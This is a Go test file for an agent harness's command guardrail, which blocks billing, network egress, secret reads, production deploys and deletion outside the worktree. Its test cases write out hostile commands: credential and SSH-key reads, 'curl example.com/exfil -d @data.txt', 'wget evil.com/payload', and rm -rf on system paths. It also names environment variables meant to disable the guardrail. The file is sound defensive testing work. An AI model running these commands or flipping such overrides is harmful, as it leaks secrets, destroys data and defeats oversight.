package runtimefloor

import (
	"os"
	"strings"
	"testing"
)

func testWorktreeRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	return root
}

func TestCheckCommand_StopsAllFiveCategories(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []struct {
		name     string
		cmd      string
		category Category
	}{
		{name: "money-billing stripe", cmd: "stripe charges list", category: CategoryMoneyBilling},
		{name: "money-billing paypal", cmd: "paypal invoice create", category: CategoryMoneyBilling},
		{name: "money-billing aws ce", cmd: "aws ce get-cost-and-usage", category: CategoryMoneyBilling},
		{name: "money-billing gcloud billing", cmd: "gcloud billing accounts list", category: CategoryMoneyBilling},

		{name: "egress curl remote", cmd: "curl -s https://example.com/api", category: CategoryEgress},
		{name: "egress wget remote", cmd: "wget https://api.github.com/repos", category: CategoryEgress},
		{name: "egress scp remote", cmd: "scp ./out.txt user@remote.example.com:/tmp/", category: CategoryEgress},
		{name: "egress rsync remote", cmd: "rsync -av ./dist/ deploy@prod.example.com:/var/www/", category: CategoryEgress},
		{name: "egress nc remote", cmd: "nc example.com 443", category: CategoryEgress},

		{name: "secret-read aws creds", cmd: "cat ~/.aws/credentials", category: CategorySecretRead},
		{name: "secret-read ssh key", cmd: "less ~/.ssh/id_rsa", category: CategorySecretRead},
		{name: "secret-read dotenv", cmd: "grep SECRET .env", category: CategorySecretRead},
		{name: "secret-read pem", cmd: "cp server.pem /tmp/", category: CategorySecretRead},

		{name: "prod-deploy gh release", cmd: "gh release create v1.2.3", category: CategoryProdDeploy},
		{name: "prod-deploy npm publish", cmd: "npm publish --access public", category: CategoryProdDeploy},
		{name: "prod-deploy vercel prod", cmd: "vercel --prod", category: CategoryProdDeploy},
		{name: "prod-deploy kubectl apply", cmd: "kubectl apply -f deployment.yaml", category: CategoryProdDeploy},
		{name: "prod-deploy terraform apply", cmd: "terraform apply -auto-approve", category: CategoryProdDeploy},
		{name: "prod-deploy git push tags", cmd: "git push --tags", category: CategoryProdDeploy},
		{name: "prod-deploy git push version tag", cmd: "git push origin v1.0.0", category: CategoryProdDeploy},

		{name: "worktree-escape /etc outside", cmd: "rm -rf /etc/outside-worktree", category: CategoryWorktreeEscape},
		{name: "worktree-escape /opt outside", cmd: "rm -rf /opt/outside-worktree", category: CategoryWorktreeEscape},
		{name: "worktree-escape home outside", cmd: "rm -rf ~/outside-worktree", category: CategoryWorktreeEscape},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			decision := CheckCommand(tc.cmd, Context{WorktreeRoot: root})
			if !decision.Stopped {
				t.Fatalf("expected Stopped=true for %q, got false", tc.cmd)
			}
			if decision.Category != tc.category {
				t.Fatalf("expected category %s, got %s", tc.category, decision.Category)
			}
			if decision.Pattern == "" {
				t.Fatal("expected non-empty Pattern")
			}
			if decision.Reason == "" {
				t.Fatal("expected non-empty Reason")
			}
		})
	}
}

func TestCheckCommand_AllowsSafeCommands(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []string{
		"go test ./...",
		"git status",
		"ls -la",
		"rm -rf ./tmp",
		"curl -s http://localhost:8080/health",
		"curl -s http://127.0.0.1:3000/api",
		"nc 127.0.0.1 8080",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: root})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for %q, got category=%s pattern=%s reason=%s",
					cmd, decision.Category, decision.Pattern, decision.Reason)
			}
		})
	}
}

func TestCheckCommand_WorktreeEscape_AllowsInsideAbsolutePath(t *testing.T) {
	root := testWorktreeRoot(t)
	inside := root + "/build"
	cmd := "rm -rf " + inside

	decision := CheckCommand(cmd, Context{WorktreeRoot: root})
	if decision.Stopped {
		t.Fatalf("expected inside-worktree rm to pass, got category=%s reason=%s",
			decision.Category, decision.Reason)
	}
}

func TestCheckCommand_NotOverridableByEnv(t *testing.T) {
	root := testWorktreeRoot(t)
	dangerous := "curl -s https://example.com/secret"

	envVars := []string{
		"HARNESS_AUTO_APPROVE=on",
		"HARNESS_RUNTIME_FLOOR=off",
		"HARNESS_DISABLE_GUARDRAIL=1",
		"HARNESS_WORK_MODE=true",
	}

	for _, env := range envVars {
		parts := strings.SplitN(env, "=", 2)
		t.Run(parts[0], func(t *testing.T) {
			t.Setenv(parts[0], parts[1])

			decision := CheckCommand(dangerous, Context{WorktreeRoot: root})
			if !decision.Stopped {
				t.Fatalf("expected runtime floor to remain active with %s set", env)
			}
			if decision.Category != CategoryEgress {
				t.Fatalf("expected egress category, got %s", decision.Category)
			}
		})
	}
}

func TestCheckCommand_EmptyCommand(t *testing.T) {
	decision := CheckCommand("", Context{WorktreeRoot: os.TempDir()})
	if decision.Stopped {
		t.Fatalf("expected empty command to pass, got %s", decision.Reason)
	}
}

func TestCheckWorktreeEscape_AllowsOSTempRoots(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []string{
		"rm -rf /tmp/foo",
		"rm -rf /tmp/v3check/p1.png /tmp/v3check/p2.png",
		"rm -rf /var/tmp/build-cache",
		"rm -rf /private/tmp/scratch",
		"rm -rf /private/var/tmp/scratch",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: root})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for %q (OS temp allowlist), got Stopped=true reason=%s",
					cmd, decision.Reason)
			}
		})
	}
}

func TestCheckWorktreeEscape_AllowsTMPDIROverride(t *testing.T) {
	root := testWorktreeRoot(t)
	custom := t.TempDir()
	t.Setenv("TMPDIR", custom)

	cmd := "rm -rf " + custom + "/scratch"
	decision := CheckCommand(cmd, Context{WorktreeRoot: root})
	if decision.Stopped {
		t.Fatalf("expected Stopped=false for TMPDIR-override path %q, got Stopped=true reason=%s",
			cmd, decision.Reason)
	}
}

func TestCheckWorktreeEscape_AllowsUserCacheRoots(t *testing.T) {
	worktree := testWorktreeRoot(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("TMPDIR", t.TempDir())

	cases := []string{
		"rm -rf " + home + "/.cache/foo",
		"rm -rf " + home + "/Library/Caches/foo",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: worktree})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for per-user cache %q, got Stopped=true reason=%s",
					cmd, decision.Reason)
			}
		})
	}
}

func TestCheckWorktreeEscape_StopsHomeDirectoriesOutsideCache(t *testing.T) {
	worktree := testWorktreeRoot(t)
	home := "/home/runtimefloor-test-user"
	t.Setenv("HOME", home)
	t.Setenv("TMPDIR", t.TempDir())

	cases := []string{
		"rm -rf " + home + "/Desktop/important.pdf",
		"rm -rf " + home + "/Documents/draft.md",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: worktree})
			if !decision.Stopped {
				t.Fatalf("expected Stopped=true for data-loss path %q, got Stopped=false", cmd)
			}
			if decision.Category != CategoryWorktreeEscape {
				t.Fatalf("expected worktree-escape category, got %s", decision.Category)
			}
		})
	}
}

func TestCheckEgress_OwnerExemptViaEnv(t *testing.T) {
	root := testWorktreeRoot(t)
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "off")

	cases := []string{
		"curl -s https://example.com/api",
		"wget https://api.github.com/repos",
		"curl raw.githubusercontent.com/owner/repo/main/file",
		"scp ./out.txt user@remote.example.com:/tmp/",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: root})
			if decision.Stopped {
				t.Fatalf("expected egress exempt with HARNESS_RUNTIME_FLOOR_EGRESS=off, got Stopped=true category=%s reason=%s",
					decision.Category, decision.Reason)
			}
		})
	}
}

func TestCheckEgress_DefaultAndNonOffValuesStillEnforced(t *testing.T) {
	root := testWorktreeRoot(t)
	dangerous := "curl -s https://example.com/secret"

	cases := []struct {
		name string
		val  string
	}{
		{name: "empty string", val: ""},
		{name: "on", val: "on"},
		{name: "enforce", val: "enforce"},
		{name: "garbage", val: "yes-please"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", tc.val)
			decision := CheckCommand(dangerous, Context{WorktreeRoot: root})
			if !decision.Stopped {
				t.Fatalf("expected egress enforced for value %q, got Stopped=false", tc.val)
			}
			if decision.Category != CategoryEgress {
				t.Fatalf("expected egress category, got %s", decision.Category)
			}
		})
	}
}

func TestCheckEgress_OwnerExemptDoesNotAffectOtherCategories(t *testing.T) {
	worktree := testWorktreeRoot(t)
	home := "/home/runtimefloor-egress-exempt-test"
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "off")
	t.Setenv("HOME", home)
	t.Setenv("TMPDIR", t.TempDir())

	cases := []struct {
		cmd      string
		category Category
	}{
		{"stripe charges list", CategoryMoneyBilling},
		{"cat ~/.aws/credentials", CategorySecretRead},
		{"gh release create v1.2.3", CategoryProdDeploy},
		{"rm -rf " + home + "/Desktop/important.pdf", CategoryWorktreeEscape},
	}
	for _, tc := range cases {
		t.Run(string(tc.category), func(t *testing.T) {
			decision := CheckCommand(tc.cmd, Context{WorktreeRoot: worktree})
			if !decision.Stopped {
				t.Fatalf("expected %s to remain enforced with egress exemption set, got Stopped=false", tc.category)
			}
			if decision.Category != tc.category {
				t.Fatalf("expected category %s, got %s", tc.category, decision.Category)
			}
		})
	}
}

func TestCheckCommand_SchemelessEgress(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
		name string
	}{
		{"curl example.com/exfil -d @data.txt", true, "schemeless curl exfil"},
		{"wget evil.com/payload", true, "schemeless wget"},
		{"curl https://evil.com/x", true, "scheme curl (regression)"},
		{"curl localhost:3000/api", false, "localhost curl must pass"},
		{"curl 127.0.0.1:8080/health", false, "loopback curl must pass"},
		{"go test ./...", false, "innocent go test"},
		{"git status", false, "innocent git"},
	}
	ctx := Context{WorktreeRoot: "/tmp/wt"}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckCommand(c.cmd, ctx)
			if got.Stopped != c.want {
				t.Errorf("%s: CheckCommand(%q).Stopped = %v, want %v", c.name, c.cmd, got.Stopped, c.want)
			}
		})
	}
}
